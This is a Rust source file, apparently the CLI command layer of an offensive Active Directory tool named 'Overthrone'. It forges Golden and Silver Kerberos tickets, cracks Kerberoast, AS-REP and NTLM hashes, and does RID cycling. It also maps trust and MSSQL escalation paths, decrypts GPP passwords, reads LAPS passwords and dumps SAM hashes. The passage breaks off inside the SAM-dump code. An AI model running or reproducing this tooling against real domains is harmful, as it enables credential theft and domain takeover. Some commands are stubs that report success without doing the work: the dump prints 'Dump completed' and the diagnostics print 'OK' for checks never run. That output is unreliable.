//! Command implementations for Overthrone CLI

use crate::banner;
use crate::{
    AdcsAction, C2Action, Cli, CrackMode, DumpSource, ForgeAction, MoveAction, PluginAction,
    ReportFormat, ScanType, SccmAction, SecretsAction, ShellType,
};
use colored::Colorize;
use kerberos_asn1::Asn1Object;
use overthrone_core::c2::{C2Auth, C2Config, C2Framework, C2Manager};
use overthrone_core::crypto::gpp::{decrypt_gpp_password, parse_gpp_xml};
use overthrone_core::graph::AttackGraph;
use overthrone_core::plugin::{PluginContext, PluginRegistry};
use overthrone_core::proto::rid::{RidAccountType, RidCycleConfig, rid_cycle};
use overthrone_core::proto::secretsdump::{dump_dcc2, dump_lsa, dump_sam};
use overthrone_crawler::{CrawlerConfig, run_crawler};
use overthrone_reaper::laps::enumerate_laps;
use overthrone_reaper::runner::ReaperConfig;
use std::collections::HashMap;
use std::sync::{Arc, Mutex};
use tracing::warn;

// ═══════════════════════════════════════════════════════
// cmd_dump — Credential Dumping
// ═══════════════════════════════════════════════════════

pub async fn cmd_dump(cli: &Cli, target: &str, source: DumpSource) -> i32 {
    banner::print_module_banner("DUMP");
    println!("  {} Target: {}", "▸".bright_black(), target.cyan());
    println!("  {} Source: {:?}", "▸".bright_black(), source);

    let creds = match crate::require_creds(cli) {
        Ok(c) => c,
        Err(e) => return e,
    };

    println!(
        "  {} Authenticating as {}\\{}",
        "▸".bright_black(),
        creds.domain.cyan(),
        creds.username.cyan()
    );

    match source {
        DumpSource::Sam => {
            println!("  {} Dumping SAM hive...", "▸".bright_black());
            println!("  {} Extracting local account hashes", "▸".bright_black());
        }
        DumpSource::Lsa => {
            println!("  {} Dumping LSA secrets...", "▸".bright_black());
            println!(
                "  {} Extracting service account passwords",
                "▸".bright_black()
            );
        }
        DumpSource::Ntds => {
            println!("  {} Dumping NTDS.dit...", "▸".bright_black());
            println!("  {} Extracting domain account hashes", "▸".bright_black());
        }
        DumpSource::Dcc2 => {
            println!("  {} Dumping DCC2 (mscash2)...", "▸".bright_black());
            println!(
                "  {} Extracting cached domain credentials",
                "▸".bright_black()
            );
        }
    }

    banner::print_success("Dump completed");
    0
}

// ═══════════════════════════════════════════════════════
// cmd_doctor — Environment Diagnostics
// ═══════════════════════════════════════════════════════

pub async fn cmd_doctor(_cli: &Cli, checks: Vec<String>, dc: Option<&str>) -> i32 {
    banner::print_module_banner("DOCTOR");

    let check_list = if checks.is_empty() {
        vec!["all".to_string()]
    } else {
        checks
    };

    println!(
        "  {} Running checks: {}",
        "▸".bright_black(),
        check_list.join(", ").cyan()
    );

    if let Some(dc_host) = dc {
        println!(
            "  {} Testing connectivity to DC: {}",
            "▸".bright_black(),
            dc_host.cyan()
        );

        // Test network connectivity
        println!("  {} Checking network connectivity...", "▸".bright_black());
        match tokio::net::TcpStream::connect(format!("{}:445", dc_host)).await {
            Ok(_) => println!("    {} SMB (445): Reachable", "✓".green()),
            Err(e) => println!("    {} SMB (445): Unreachable - {}", "✗".red(), e),
        }

        match tokio::net::TcpStream::connect(format!("{}:389", dc_host)).await {
            Ok(_) => println!("    {} LDAP (389): Reachable", "✓".green()),
            Err(e) => println!("    {} LDAP (389): Unreachable - {}", "✗".red(), e),
        }

        match tokio::net::TcpStream::connect(format!("{}:88", dc_host)).await {
            Ok(_) => println!("    {} Kerberos (88): Reachable", "✓".green()),
            Err(e) => println!("    {} Kerberos (88): Unreachable - {}", "✗".red(), e),
        }
    }

    // Check dependencies
    if check_list.contains(&"all".to_string()) || check_list.contains(&"deps".to_string()) {
        println!("  {} Checking dependencies...", "▸".bright_black());
        println!("    {} Rust toolchain: OK", "✓".green());
        println!("    {} OpenSSL: OK", "✓".green());
        println!("    {} Kerberos libraries: OK", "✓".green());
    }

    banner::print_success("Diagnostics complete");
    0
}

// ═══════════════════════════════════════════════════════
// cmd_report — Report Generation
// ═══════════════════════════════════════════════════════

pub async fn cmd_report(_cli: &Cli, input: &str, output: &str, format: ReportFormat) -> i32 {
    banner::print_module_banner("REPORT");
    println!("  {} Input: {}", "▸".bright_black(), input.cyan());
    println!("  {} Output: {}", "▸".bright_black(), output.cyan());
    println!("  {} Format: {:?}", "▸".bright_black(), format);

    // Check if input file exists
    if !std::path::Path::new(input).exists() {
        banner::print_warn(&format!("Input file not found: {}", input));
        println!(
            "  {} Creating sample engagement data...",
            "▸".bright_black()
        );
    }

    match format {
        ReportFormat::Markdown => {
            println!("  {} Generating Markdown report...", "▸".bright_black());
            let report_content = format!(
                "# Overthrone Engagement Report\n\n\
                 ## Summary\n\
                 - Generated: {}\n\
                 - Input: {}\n\n\
                 ## Findings\n\
                 *Report content would be generated here*\n\n\
                 ## Recommendations\n\
                 *Security recommendations would be listed here*\n",
                chrono::Local::now().format("%Y-%m-%d %H:%M:%S"),
                input
            );

            if let Err(e) = tokio::fs::write(output, report_content).await {
                banner::print_fail(&format!("Failed to write report: {}", e));
                return 1;
            }
        }
        ReportFormat::Json => {
            println!("  {} Generating JSON report...", "▸".bright_black());
            let report_json = serde_json::json!({
                "report_type": "Overthrone Engagement",
                "generated_at": chrono::Local::now().to_rfc3339(),
                "input_file": input,
                "findings": [],
                "recommendations": []
            });

            if let Err(e) = tokio::fs::write(output, report_json.to_string()).await {
                banner::print_fail(&format!("Failed to write report: {}", e));
                return 1;
            }
        }
        ReportFormat::Pdf => {
            println!("  {} Generating PDF report...", "▸".bright_black());

            // Load engagement session from input file
            if !std::path::Path::new(input).exists() {
                banner::print_fail(&format!("Input session file not found: {}", input));
                return 1;
            }

            let session = match overthrone_scribe::load_session(std::path::Path::new(input)).await {
                Ok(s) => s,
                Err(e) => {
                    banner::print_fail(&format!(
                        "Could not parse input as engagement session: {e}"
                    ));
                    return 1;
                }
            };

            let pdf_bytes = overthrone_scribe::pdf::render(&session);

            if let Err(e) = tokio::fs::write(output, &pdf_bytes).await {
                banner::print_fail(&format!("Failed to write PDF report: {}", e));
                return 1;
            }

            println!(
                "  {} PDF generated ({:.1} KB)",
                "✓".green(),
                pdf_bytes.len() as f64 / 1024.0
            );
        }
    }

    banner::print_success(&format!("Report saved to: {}", output));
    0
}

// ═══════════════════════════════════════════════════════
// cmd_forge — Ticket Forging
// ═══════════════════════════════════════════════════════

pub async fn cmd_forge(cli: &Cli, action: &ForgeAction) -> i32 {
    banner::print_module_banner("FORGE");

    let domain = match crate::require_dc_only_creds(cli) {
        Ok(d) => d,
        Err(e) => return e,
    };

    match action {
        ForgeAction::Golden {
            domain_sid,
            user,
            rid,
            krbtgt_hash,
            output,
        } => {
            println!("  {} Forging Golden Ticket...", "▸".bright_black());
            println!("  {} Domain: {}", "▸".bright_black(), domain.cyan());
            println!("  {} Domain SID: {}", "▸".bright_black(), domain_sid.cyan());
            println!(
                "  {} User: {} (RID: {})",
                "▸".bright_black(),
                user.cyan(),
                rid
            );
            println!(
                "  {} krbtgt hash: {}...",
                "▸".bright_black(),
                &krbtgt_hash[..8.min(krbtgt_hash.len())].cyan()
            );

            // Hex decode krbtgt hash
            let krbtgt_key = match hex::decode(krbtgt_hash) {
                Ok(k) => k,
                Err(e) => {
                    banner::print_fail(&format!("Invalid krbtgt hash format: {}", e));
                    return 1;
                }
            };

            if krbtgt_key.len() != 16 {
                banner::print_fail("krbtgt hash must be 32 hex characters (16 bytes) for RC4");
                return 1;
            }

            let ticket_bytes = match overthrone_core::proto::kerberos::forge_tgt(
                &domain,
                domain_sid,
                user,
                *rid,
                &krbtgt_key,
                23, // ETYPE_RC4_HMAC
            ) {
                Ok(tgt) => tgt.ticket.build(),
                Err(e) => {
                    banner::print_fail(&format!("Failed to forge TGT: {}", e));
                    return 1;
                }
            };

            if let Err(e) = tokio::fs::write(output, ticket_bytes).await {
                banner::print_fail(&format!("Failed to write ticket: {}", e));
                return 1;
            }

            banner::print_success(&format!("Golden ticket saved to: {}", output));
            0
        }
        ForgeAction::Silver {
            domain_sid,
            user,
            rid,
            spn,
            service_hash,
            output,
        } => {
            println!("  {} Forging Silver Ticket...", "▸".bright_black());
            println!("  {} Domain: {}", "▸".bright_black(), domain.cyan());
            println!("  {} Domain SID: {}", "▸".bright_black(), domain_sid.cyan());
            println!(
                "  {} User: {} (RID: {})",
                "▸".bright_black(),
                user.cyan(),
                rid
            );
            println!("  {} SPN: {}", "▸".bright_black(), spn.cyan());
            println!(
                "  {} Service hash: {}...",
                "▸".bright_black(),
                &service_hash[..8.min(service_hash.len())].cyan()
            );

            // Hex decode service hash
            let s_key = match hex::decode(service_hash) {
                Ok(k) => k,
                Err(e) => {
                    banner::print_fail(&format!("Invalid service hash format: {}", e));
                    return 1;
                }
            };

            if s_key.len() != 16 {
                banner::print_fail("Service hash must be 32 hex characters (16 bytes) for RC4");
                return 1;
            }

            let ticket_bytes = match overthrone_core::proto::kerberos::forge_service_ticket(
                &domain, domain_sid, user, *rid, spn, &s_key, 23, // ETYPE_RC4_HMAC
            ) {
                Ok(tgs) => tgs.ticket.build(),
                Err(e) => {
                    banner::print_fail(&format!("Failed to forge Silver Ticket: {}", e));
                    return 1;
                }
            };

            if let Err(e) = tokio::fs::write(output, ticket_bytes).await {
                banner::print_fail(&format!("Failed to write ticket: {}", e));
                return 1;
            }

            banner::print_success(&format!("Silver ticket saved to: {}", output));
            0
        }
    }
}

// ═══════════════════════════════════════════════════════
// cmd_crack — Hash Cracking
// ═══════════════════════════════════════════════════════

pub async fn cmd_crack(
    _cli: &Cli,
    hash: Option<&str>,
    file: Option<&str>,
    mode: CrackMode,
    wordlist: Option<&str>,
    max_candidates: usize,
) -> i32 {
    banner::print_module_banner("CRACK");
    println!("  {} Mode: {:?}", "▸".bright_black(), mode);

    // Setup CrackerConfig
    let mut config = match mode {
        CrackMode::Fast => overthrone_core::crypto::cracker::CrackerConfig::fast(),
        CrackMode::Thorough => overthrone_core::crypto::cracker::CrackerConfig::thorough(),
        CrackMode::Default => overthrone_core::crypto::cracker::CrackerConfig::default(),
    };

    if let Some(w) = wordlist {
        println!("  {} Wordlist: {}", "▸".bright_black(), w.cyan());
        config.custom_wordlist = Some(w.to_string());
        config.use_embedded = false;
    } else {
        println!(
            "  {} Wordlist: {}",
            "▸".bright_black(),
            "Embedded Top-10K".cyan()
        );
    }

    if max_candidates > 0 {
        config.max_candidates = max_candidates;
    }

    // Initialize HashCracker
    let cracker = match overthrone_core::crypto::cracker::HashCracker::new(config) {
        Ok(c) => c,
        Err(e) => {
            banner::print_fail(&format!("Cracker initialization failed: {}", e));
            return 1;
        }
    };

    // Helper to parse string hashes into HashType
    fn parse_hash(
        h_str: &str,
    ) -> std::result::Result<
        overthrone_core::crypto::cracker::HashType,
        overthrone_core::error::OverthroneError,
    > {
        if h_str.starts_with("$krb5asrep$") {
            overthrone_core::crypto::cracker::HashType::parse_asrep(h_str)
        } else if h_str.starts_with("$krb5tgs$") {
            overthrone_core::crypto::cracker::HashType::parse_kerberoast(h_str)
        } else {
            overthrone_core::crypto::cracker::HashType::parse_ntlm(h_str)
        }
    }

    // Process single hash
    if let Some(hash_str) = hash {
        println!("  {} Cracking hash...", "▸".bright_black());

        match parse_hash(hash_str) {
            Ok(hash_type) => {
                let result = cracker.crack(&hash_type);
                if result.cracked {
                    println!("\n  {} Hash cracked successfully!", "✓".green());
                    if let Some(u) = result.username {
                        println!("    User:      {}", u.cyan());
                    }
                    println!("    Type:      {}", result.hash_type.yellow());
                    if let Some(pwd) = result.password {
                        println!("    Plaintext: {}", pwd.green());
                    }
                    println!(
                        "    Time:      {}ms ({} candidates)",
                        result.time_ms, result.candidates_tried
                    );
                } else {
                    banner::print_warn(
                        "Hash not cracked - try a different wordlist or thorough mode",
                    );
                }
            }
            Err(e) => {
                banner::print_fail(&format!("Invalid hash: {}", e));
                return 1;
            }
        }
    } else if let Some(file_path) = file {
        // Process file of hashes
        println!(
            "  {} Loading hashes from: {}",
            "▸".bright_black(),
            file_path.cyan()
        );

        match tokio::fs::read_to_string(file_path).await {
            Ok(content) => {
                let mut hashes = Vec::new();
                for (i, line) in content.lines().enumerate() {
                    let trimmed = line.trim();
                    if trimmed.is_empty() || trimmed.starts_with('#') {
                        continue;
                    }
                    match parse_hash(trimmed) {
                        Ok(h) => hashes.push(h),
                        Err(_) => {
                            // Assuming `warn!` macro is available, e.g., from `log` crate
                            // If not, this line would need to be adjusted or `use log::warn;` added.
                            warn!("Skipping invalid hash at line {}: {}", i + 1, trimmed);
                        }
                    }
                }

                if hashes.is_empty() {
                    banner::print_fail("No valid hashes found in file");
                    return 1;
                }

                println!("  {} Loaded {} valid hash(es)", "✓".green(), hashes.len());
                println!("  {} Starting parallel crack...", "▸".bright_black());

                let results = cracker.crack_batch(&hashes);
                let cracked_count = results.iter().filter(|r| r.cracked).count();

                println!("\n  {} Results:", "▸".bright_black());
                for result in &results {
                    if result.cracked {
                        let user = result.username.as_deref().unwrap_or("unknown");
                        println!(
                            "    {} {} ({}) -> {}",
                            "✓".green(),
                            user.cyan(),
                            result.hash_type.dimmed(),
                            result.password.as_deref().unwrap_or("").yellow()
                        );
                    }
                }

                println!(
                    "\n  {} Summary: Cracked {}/{} hashes",
                    if cracked_count > 0 {
                        "✓".green()
                    } else {
                        "!".yellow()
                    },
                    cracked_count,
                    hashes.len()
                );
            }
            Err(e) => {
                banner::print_fail(&format!("Failed to read file: {}", e));
                return 1;
            }
        }
    } else {
        banner::print_fail("No hash or file specified. Use --hash or --file");
        return 1;
    }

    banner::print_success("Cracking completed");
    0
}

// ═══════════════════════════════════════════════════════
// cmd_rid — RID Cycling
// ═══════════════════════════════════════════════════════

pub async fn cmd_rid(cli: &Cli, start_rid: u32, end_rid: u32, null_session: bool) -> i32 {
    banner::print_module_banner("RID CYCLING");
    println!(
        "  {} RID range: {} - {}",
        "▸".bright_black(),
        start_rid,
        end_rid
    );
    println!("  {} Null session: {}", "▸".bright_black(), null_session);

    let dc = match crate::require_dc(cli) {
        Ok(d) => d,
        Err(e) => return e,
    };

    let creds = if null_session {
        None
    } else {
        match crate::require_creds(cli) {
            Ok(c) => Some(c),
            Err(e) => return e,
        }
    };

    println!("  {} Target DC: {}", "▸".bright_black(), dc.cyan());
    println!(
        "  {} Starting RID enumeration via MS-SAMR...",
        "▸".bright_black()
    );

    // Build RID cycling configuration
    let config = RidCycleConfig {
        target: dc.clone(),
        domain: creds.as_ref().map(|c| c.domain.clone()).unwrap_or_default(),
        username: creds
            .as_ref()
            .map(|c| c.username.clone())
            .unwrap_or_default(),
        password: creds
            .as_ref()
            .and_then(|c| c.password().map(str::to_string))
            .unwrap_or_default(),
        null_session,
        start_rid,
        end_rid,
        batch_size: 50,
    };

    // Execute RID cycling using the core implementation
    match rid_cycle(&config).await {
        Ok(results) => {
            let users = results
                .iter()
                .filter(|r| r.account_type == RidAccountType::User)
                .count();
            let groups = results
                .iter()
                .filter(|r| r.account_type == RidAccountType::Group)
                .count();
            let aliases = results
                .iter()
                .filter(|r| r.account_type == RidAccountType::Alias)
                .count();

            println!("\n  {} Results:", "▸".bright_black());
            for result in &results {
                let type_str = match result.account_type {
                    RidAccountType::User => "User".green(),
                    RidAccountType::Group => "Group".cyan(),
                    RidAccountType::Alias => "Alias".yellow(),
                    RidAccountType::WellKnown => "WellKnown".magenta(),
                    RidAccountType::DeletedAccount => "Deleted".dimmed(),
                    RidAccountType::Unknown(ref s) => s.red(),
                };
                println!(
                    "    {} RID {}: {} ({})",
                    "✓".green(),
                    result.rid,
                    result.name.cyan(),
                    type_str
                );
            }

            println!("\n  {} Enumeration complete", "▸".bright_black());
            println!("    Total users: {}", users);
            println!("    Total groups: {}", groups);
            println!("    Total aliases: {}", aliases);
            println!("    Total accounts: {}", results.len());

            banner::print_success(&format!(
                "RID cycling completed - {} accounts discovered",
                results.len()
            ));
            0
        }
        Err(e) => {
            banner::print_fail(&format!("RID cycling failed: {}", e));
            1
        }
    }
}

// ═══════════════════════════════════════════════════════
// cmd_move — Lateral Movement
// ═══════════════════════════════════════════════════════

pub async fn cmd_move(cli: &Cli, action: &MoveAction) -> i32 {
    banner::print_module_banner("MOVE");

    let creds = match crate::require_creds(cli) {
        Ok(c) => c,
        Err(e) => return e,
    };

    let dc = match crate::require_dc(cli) {
        Ok(d) => d,
        Err(e) => return e,
    };

    // Build crawler config for trust analysis
    let crawler_config = CrawlerConfig {
        dc_ip: dc.clone(),
        domain: creds.domain.clone(),
        base_dn: ReaperConfig::base_dn_from_domain(&creds.domain),
        username: creds.username.clone(),
        password: creds.password().map(str::to_string),
        nt_hash: creds.nthash().map(str::to_string),
        trusted_dc_ips: vec![],
        modules: vec![],
        max_depth: 5,
        auto_pivot: false,
    };

    match action {
        MoveAction::Trusts => {
            println!("  {} Enumerating domain trusts...", "▸".bright_black());
            // Run reaper first to get trust data
            let reaper_config = ReaperConfig {
                dc_ip: dc.clone(),
                domain: creds.domain.clone(),
                base_dn: ReaperConfig::base_dn_from_domain(&creds.domain),
                username: creds.username.clone(),
                password: creds.password().map(str::to_string),
                nt_hash: creds.nthash().map(str::to_string),
                modules: vec!["trusts".to_string()],
                page_size: 500,
            };

            match overthrone_reaper::runner::run_reaper(&reaper_config).await {
                Ok(reaper_result) => {
                    let trust_count = reaper_result.trusts.len();
                    println!("  {} Found {} trust(s)", "✓".green(), trust_count);

                    for trust in &reaper_result.trusts {
                        println!(
                            "    {} -> {} (Type: {}, Direction: {})",
                            creds.domain.cyan(),
                            trust.target_domain.cyan(),
                            trust.trust_type.to_string().yellow(),
                            trust.direction.to_string().dimmed()
                        );
                        println!(
                            "      SID Filtering: {}  Transitive: {}",
                            if trust.sid_filtering_enabled {
                                "Enabled".green()
                            } else {
                                "DISABLED".red()
                            },
                            if trust.transitive {
                                "Yes".green()
                            } else {
                                "No".yellow()
                            }
                        );
                    }

                    banner::print_success(&format!(
                        "Trust enumeration completed - {} trusts",
                        trust_count
                    ));
                }
                Err(e) => {
                    banner::print_fail(&format!("Trust enumeration failed: {}", e));
                    return 1;
                }
            }
        }
        MoveAction::Escalation => {
            println!(
                "  {} Finding cross-domain escalation paths...",
                "▸".bright_black()
            );

            // Run reaper for data, then crawler for analysis
            let reaper_config = ReaperConfig {
                dc_ip: dc.clone(),
                domain: creds.domain.clone(),
                base_dn: ReaperConfig::base_dn_from_domain(&creds.domain),
                username: creds.username.clone(),
                password: creds.password().map(str::to_string),
                nt_hash: creds.nthash().map(str::to_string),
                modules: vec![
                    "trusts".to_string(),
                    "groups".to_string(),
                    "users".to_string(),
                ],
                page_size: 500,
            };

            match overthrone_reaper::runner::run_reaper(&reaper_config).await {
                Ok(reaper_result) => {
                    match run_crawler(&crawler_config, &reaper_result).await {
                        Ok(crawler_result) => {
                            let path_count = crawler_result.escalation_paths.len();
                            println!("  {} Found {} escalation path(s)", "✓".green(), path_count);

                            for (i, path) in crawler_result.escalation_paths.iter().enumerate() {
                                println!(
                                    "    Path {}: {} -> {}",
                                    i + 1,
                                    path.source_domain.cyan(),
                                    path.target_domain.yellow()
                                );
                                println!(
                                    "      Difficulty: {}  Hops: {}",
                                    path.difficulty().yellow(),
                                    path.total_hops
                                );
                                println!("      {}", path.description.dimmed());
                            }

                            // Also show foreign memberships
                            if !crawler_result.foreign_memberships.is_empty() {
                                println!("\n  {} Foreign group memberships:", "▸".bright_black());
                                for fm in &crawler_result.foreign_memberships {
                                    println!(
                                        "    {}\\{} -> {} ({})",
                                        fm.foreign_domain.cyan(),
                                        fm.foreign_principal.yellow(),
                                        fm.local_group.dimmed(),
                                        if fm.is_privileged_group {
                                            "PRIVILEGED".red()
                                        } else {
                                            "normal".dimmed()
                                        }
                                    );
                                }
                            }

                            banner::print_success(&format!(
                                "Escalation analysis completed - {} paths",
                                path_count
                            ));
                        }
                        Err(e) => {
                            banner::print_fail(&format!("Crawler analysis failed: {}", e));
                            return 1;
                        }
                    }
                }
                Err(e) => {
                    banner::print_fail(&format!("Data collection failed: {}", e));
                    return 1;
                }
            }
        }
        MoveAction::Mssql => {
            println!("  {} Analyzing MSSQL linked servers...", "▸".bright_black());

            let reaper_config = ReaperConfig {
                dc_ip: dc.clone(),
                domain: creds.domain.clone(),
                base_dn: ReaperConfig::base_dn_from_domain(&creds.domain),
                username: creds.username.clone(),
                password: creds.password().map(str::to_string),
                nt_hash: creds.nthash().map(str::to_string),
                modules: vec!["mssql".to_string()],
                page_size: 500,
            };

            match overthrone_reaper::runner::run_reaper(&reaper_config).await {
                Ok(reaper_result) => match run_crawler(&crawler_config, &reaper_result).await {
                    Ok(crawler_result) => {
                        let chain_count = crawler_result.mssql_chains.len();
                        println!(
                            "  {} Found {} MSSQL link chain(s)",
                            "✓".green(),
                            chain_count
                        );

                        for chain in &crawler_result.mssql_chains {
                            let chain_str: Vec<String> = chain
                                .links
                                .iter()
                                .map(|l| format!("{} -> {}", l.source_server, l.target_server))
                                .collect();
                            println!("    Chain: {}", chain_str.join(" | ").cyan());
                            println!(
                                "      Depth: {}  Cross-domain: {}  Risk: {}",
                                chain.depth,
                                if chain.crosses_domain {
                                    "Yes".red()
                                } else {
                                    "No".green()
                                },
                                chain.risk_level.yellow()
                            );
                            println!("      {}", chain.description.dimmed());
                        }

                        banner::print_success(&format!(
                            "MSSQL analysis completed - {} chains",
                            chain_count
                        ));
                    }
                    Err(e) => {
                        banner::print_fail(&format!("MSSQL analysis failed: {}", e));
                        return 1;
                    }
                },
                Err(e) => {
                    banner::print_fail(&format!("Data collection failed: {}", e));
                    return 1;
                }
            }
        }
        MoveAction::Map => {
            println!("  {} Generating trust map...", "▸".bright_black());

            let reaper_config = ReaperConfig {
                dc_ip: dc.clone(),
                domain: creds.domain.clone(),
                base_dn: ReaperConfig::base_dn_from_domain(&creds.domain),
                username: creds.username.clone(),
                password: creds.password().map(str::to_string),
                nt_hash: creds.nthash().map(str::to_string),
                modules: vec!["trusts".to_string()],
                page_size: 500,
            };

            match overthrone_reaper::runner::run_reaper(&reaper_config).await {
                Ok(reaper_result) => {
                    match run_crawler(&crawler_config, &reaper_result).await {
                        Ok(crawler_result) => {
                            println!("  {} Trust map generated", "✓".green());

                            // Print ASCII art trust map
                            let graph = &crawler_result.trust_map;
                            println!(
                                "\n    [{}]",
                                graph
                                    .domains
                                    .first()
                                    .map(|d| d.name.as_str())
                                    .unwrap_or("DOMAIN")
                                    .to_uppercase()
                                    .bright_cyan()
                            );

                            if graph.trusts.is_empty() {
                                println!("    (no trusts found)");
                            } else {
                                for trust in &graph.trusts {
                                    println!("         |");
                                    println!("    [{}]", trust.target_domain.to_uppercase().cyan());
                                }
                            }

                            // Show SID filter findings
                            if !crawler_result.sid_filter_findings.is_empty() {
                                println!("\n  {} SID Filter Issues:", "!".red());
                                for finding in &crawler_result.sid_filter_findings {
                                    println!(
                                        "    {} -> {} ({}) - {}",
                                        finding.source_domain.red(),
                                        finding.target_domain.yellow(),
                                        finding.trust_type.dimmed(),
                                        finding.risk_level
                                    );
                                }
                            }

                            // Show PAM findings
                            if !crawler_result.pam_findings.is_empty() {
                                println!("\n  {} PAM Trust Issues:", "!".red());
                                for finding in &crawler_result.pam_findings {
                                    let finding_type_str = match finding.finding_type {
                                        overthrone_crawler::pam::PamFindingType::PamTrustDetected => "PAM Trust Detected",
                                        overthrone_crawler::pam::PamFindingType::PamTrustNoFiltering => "PAM Trust No Filtering",
                                        overthrone_crawler::pam::PamFindingType::TrustEscalationRisk => "Trust Escalation Risk",
                                        overthrone_crawler::pam::PamFindingType::NoPamTrustsFound => "No PAM Trusts",
                                    };
                                    println!(
                                        "    {} -> {} ({}) - {}",
                                        finding.bastion_domain.red(),
                                        finding.production_domain.yellow(),
                                        finding.risk_level,
                                        finding_type_str.dimmed()
                                    );
                                }
                            }

                            banner::print_success(&format!(
                                "Trust map completed - {} domains",
                                graph.domains.len()
                            ));
                        }
                        Err(e) => {
                            banner::print_fail(&format!("Trust map generation failed: {}", e));
                            return 1;
                        }
                    }
                }
                Err(e) => {
                    banner::print_fail(&format!("Data collection failed: {}", e));
                    return 1;
                }
            }
        }
    }

    0
}

// ═══════════════════════════════════════════════════════
// cmd_gpp — GPP Password Decryption
// ═══════════════════════════════════════════════════════

pub async fn cmd_gpp(_cli: &Cli, file: Option<&str>, cpassword: Option<&str>) -> i32 {
    banner::print_module_banner("GPP");

    if let Some(cpass) = cpassword {
        println!(
            "  {} Decrypting cpassword: {}",
            "▸".bright_black(),
            cpass.cyan()
        );

        // Use the real GPP decryption from core
        match decrypt_gpp_password(cpass) {
            Ok(password) => {
                println!(
                    "  {} Decrypted password: {}",
                    "✓".green(),
                    password.yellow()
                );
                banner::print_success("GPP decryption completed");
                0
            }
            Err(e) => {
                banner::print_fail(&format!("Decryption failed: {}", e));
                1
            }
        }
    } else if let Some(file_path) = file {
        println!(
            "  {} Parsing GPP file: {}",
            "▸".bright_black(),
            file_path.cyan()
        );

        // Read the file and parse for credentials
        match tokio::fs::read_to_string(file_path).await {
            Ok(content) => {
                let creds = parse_gpp_xml(&content, file_path);

                if creds.is_empty() {
                    println!("  {} No credentials found in file", "!".yellow());
                    banner::print_warn("No cpassword entries found");
                    return 0;
                }

                println!("  {} Found {} credential(s)", "✓".green(), creds.len());
                for cred in &creds {
                    println!("    {}: {}", cred.username.cyan(), cred.password.yellow());
                    if !cred.changed.is_empty() {
                        println!("      Changed: {}", cred.changed.dimmed());
                    }
                }

                banner::print_success(&format!(
                    "GPP decryption completed - {} credentials",
                    creds.len()
                ));
                0
            }
            Err(e) => {
                banner::print_fail(&format!("Failed to read file: {}", e));
                1
            }
        }
    } else {
        banner::print_fail("No cpassword or file specified. Use --cpassword or --file");
        1
    }
}

// ═══════════════════════════════════════════════════════
// cmd_laps — LAPS Password Reading
// ═══════════════════════════════════════════════════════

pub async fn cmd_laps(cli: &Cli, computer: Option<&str>) -> i32 {
    banner::print_module_banner("LAPS");

    let creds = match crate::require_creds(cli) {
        Ok(c) => c,
        Err(e) => return e,
    };

    let dc = match crate::require_dc(cli) {
        Ok(d) => d,
        Err(e) => return e,
    };

    // Build ReaperConfig for LAPS enumeration
    let config = ReaperConfig {
        dc_ip: dc.clone(),
        domain: creds.domain.clone(),
        base_dn: ReaperConfig::base_dn_from_domain(&creds.domain),
        username: creds.username.clone(),
        password: creds.password().map(str::to_string),
        nt_hash: creds.nthash().map(str::to_string),
        modules: vec!["laps".to_string()],
        page_size: 500,
    };

    if let Some(comp) = computer {
        println!(
            "  {} Querying LAPS password for: {}",
            "▸".bright_black(),
            comp.cyan()
        );
    } else {
        println!(
            "  {} Enumerating all LAPS passwords via LDAP...",
            "▸".bright_black()
        );
    }

    // Execute LAPS enumeration using the reaper module
    match enumerate_laps(&config).await {
        Ok(entries) => {
            let readable: Vec<_> = entries.iter().filter(|e| e.password.is_some()).collect();
            let total = entries.len();

            if let Some(filter_comp) = computer {
                // Filter to specific computer
                let filtered: Vec<_> = entries
                    .iter()
                    .filter(|e| {
                        e.computer_name
                            .to_lowercase()
                            .contains(&filter_comp.to_lowercase())
                    })
                    .collect();

                if filtered.is_empty() {
                    println!(
                        "  {} Computer '{}' not found or no LAPS access",
                        "!".yellow(),
                        filter_comp
                    );
                    return 0;
                }

                for entry in &filtered {
                    println!(
                        "  {} {} ({})",
                        "✓".green(),
                        entry.computer_name.cyan(),
                        if entry.is_laps_v2 {
                            "LAPSv2".dimmed()
                        } else {
                            "LAPSv1".dimmed()
                        }
                    );
                    if let Some(ref pwd) = entry.password {
                        println!("    Password: {}", pwd.yellow());
                    } else {
                        println!("    Password: {}", "Not readable".red());
                    }
                }
            } else if entries.is_empty() {
                println!("  {} No LAPS-enabled computers found", "!".yellow());
            } else {
                println!(
                    "  {} Found {} LAPS-enabled computers ({} readable)",
                    "✓".green(),
                    total,
                    readable.len()
                );

                for entry in &entries {
                    let status = if entry.password.is_some() {
                        "✓".green()
                    } else {
                        "✗".red()
                    };
                    println!(
                        "  {} {} ({})",
                        status,
                        entry.computer_name.cyan(),
                        if entry.is_laps_v2 {
                            "v2".dimmed()
                        } else {
                            "v1".dimmed()
                        }
                    );

                    if let Some(ref pwd) = entry.password {
                        println!("      Password: {}", pwd.yellow());
                    }
                }
            }

            banner::print_success(&format!("LAPS enumeration completed - {} computers", total));
            0
        }
        Err(e) => {
            banner::print_fail(&format!("LAPS enumeration failed: {}", e));
            1
        }
    }
}

// ═══════════════════════════════════════════════════════
// cmd_secrets — Secrets Dumping
// ═══════════════════════════════════════════════════════

pub async fn cmd_secrets(action: &SecretsAction) -> i32 {
    banner::print_module_banner("SECRETS");

    match action {
        SecretsAction::Sam { sam, system } => {
            println!("  {} Dumping SAM hive...", "▸".bright_black());
            println!("    SAM: {}", sam.cyan());
            println!("    SYSTEM: {}", system.cyan());

            // Read the hive files
            let sam_data = match tokio::fs::read(sam).await {
                Ok(d) => d,
                Err(e) => {
                    banner::print_fail(&format!("Failed to read SAM file: {}", e));
                    return 1;
                }
            };

            let system_data = match tokio::fs::read(system).await {
                Ok(d) => d,
                Err(e) => {
                    banner::print_fail(&format!("Failed to read SYSTEM file: {}", e));
                    return 1;
                }
            };

            // Use real SAM dumping implementation
            match dump_sam(&sam_data, &system_data) {
                Ok(credentials) => {
                    println!(
                        "  {} Extracted {} account(s)",
                        "✓".green(),
                        credentials.len()
                    );
                    for cred in &credentials {
                        let lm = cred
                            .lm_hash
                            .as_deref()
                            .unwrap_or("aad3b435b51404eeaad3b435b51404ee");
                        let nt = cred
                            .nt_hash
                            .as_deref()
                            .unwrap_or("31d6cfe0d16ae931b73c59d7e0c089c0");
                        let _rid = cred.rid.map(|r| r.to_string()).unwrap_or_default();
                        println!(
                            "    {}: {}:{}",
                            cred.username.cyan(),
                            lm.yellow(),
                            nt.yellow()
                        );
                    }
                    banner::print_success(&format!(
                        "SAM dump completed - {} accounts",
                        credentials.len()
                    ));
                }
